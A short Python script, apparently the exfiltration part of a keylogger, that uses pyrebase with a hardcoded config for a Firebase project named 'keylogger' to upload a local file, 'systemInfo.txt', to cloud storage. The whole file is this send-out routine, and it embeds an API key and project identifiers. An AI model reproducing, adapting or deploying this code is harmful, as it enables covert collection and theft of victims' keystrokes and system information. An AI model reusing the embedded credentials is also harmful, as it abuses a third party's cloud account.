import pyrebase 

def connect_to_firebase():
    config = {
        "apiKey": "AIzaSyAboBophk8DAJBXmn4ltGZyGlYZnRqEpXQ",
        "authDomain": "keylogger-e4335.firebaseapp.com",
        "databaseURL": "https://keylogger-e4335-default-rtdb.asia-southeast1.firebasedatabase.app/",
        "projectId": "keylogger-e4335",
        "storageBucket": "keylogger-e4335.appspot.com",
        "messagingSenderId": "880295281065",
        "appId": "1:880295281065:web:31b4dba6661594ba84c4b8",
        "measurementId": "G-YNJP3TKYWM"
    }

    firebase = pyrebase.initialize_app(config)
    storage = firebase.storage()
    
    return storage

def upload(storage, path_on_system):
    # Check if '/' is present in the path
    if '/' in path_on_system:
        pos1 = path_on_system.rindex('/')
    else:
        pos1 = -1
    pos2 = path_on_system.rindex('.')

    path_on_cloud = "text/" + path_on_system[ pos1 + 1 : pos2] + path_on_system[pos2:]
    storage.child(path_on_cloud).put(path_on_system)
      
storage = connect_to_firebase()
path_on_system = "systemInfo.txt"
upload(storage, path_on_system)